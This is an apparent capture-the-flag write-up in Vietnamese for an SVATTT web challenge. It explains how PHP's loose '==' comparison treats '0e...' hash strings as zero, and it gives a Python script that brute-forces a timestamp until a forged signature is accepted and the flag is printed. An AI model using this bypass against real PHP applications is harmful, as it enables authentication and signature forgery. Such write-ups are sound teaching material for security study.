
http://readfile.svattt.org:8888/web100.php.bak</br>
Khi mà bắt đầu giải quyết vấn đề này, thực sự khá khó khăn khi chỉ nhìn về mỗi biến $secretkey. Cho đến khi chú ý đến $sig == $realsig. Một thứ gì đó gợi nhớ đến PHP type juggling. Và chính xác đó là Comparison Issues…Một trong những lỗi cơ bản trong PHP.
</br>
Có thể giải thích điều này như sau:
</br>
Nếu một chuỗi được chuyển đổi sang một phao sau đó chúng ta có thể kết hợp nhiều. Bất cứ thứ  gì mà sau regex của 0+[eE]\d + sẽ cho kết quả là 0. Mọi người sẽ nghĩ rằng 1[eE]\d sẽ cũng làm việc như 1 cũng như với bất cứ thứ gì được cho là 1, nhưng đây không phải là cách, strtod () chức năng thực sự hoạt động. Bây giờ, chúng ta hãy xem xét một số ví dụ so sánh để nhìn thấy điều này làm việc:
</br>
$input = $_GET['input'];</br>
if ($input == "0e94323") {</br>
        print("$input == 0e94323 ");</br>
}</br>
if ($input == "00e19384") {</br>
        print("$input == 00e19384 ");</br>
}</br>

localhost/test.php?input=0 </br>

0 == 0e94323 </br>
0 == 00e19384</br>

Nhớ lại một điều việc sử dụng phép so sánh với “==” trong php. Bạn có thể nhìn vào bảng sau được cung cấp bởi Gynyael Coldwing với link https://docs.google.com/spreadsheets/d/1oWsmTvEZcfgc_1QkBczNGA3Gcffg_pmgKcak7iZldUw/pub?output=html .
</br>Bây giờ hãy nhìn vào biến $sig = 0e462097431906509019562988736854. Biến này được khai báo ngẫu nhiên với một mã hash 32 ký tự bắt đầu với số 0. Khi sử dụng nó so sánh với một biến mang mã hash, chúng ta sẽ đạt được giá trị TRUE như đã phân tích ở trên.
</br>def work():
</br>	while True:
</br>		url = 'http://readfile.svattt.org:8888/web100.php' #filename=flag.php&timestamp=13371337&sig=d7a52c3ed325ef19'
</br>		payload = {'filename': filename, 'timestamp': random.randint(0, 10000000), 'sig': sig }

</br>		r = requests.get(url, params=payload)
</br>		text = r.content

</br>		if 'Invalid Signature!' not in text:
</br>			print text 
</br>			break
</br>Nó thực sự là một kĩ thuật bruteforce với tham số timestamp cho đến khi ta đã được một mã hash có thể so sánh với $sig nhập vào và đạt được giá trị là TRUE với kí tự 0.
</br>Got it.

Flag: SVATTT{N0_m0r3_h4sh_3xtens10n_4tt4ck}
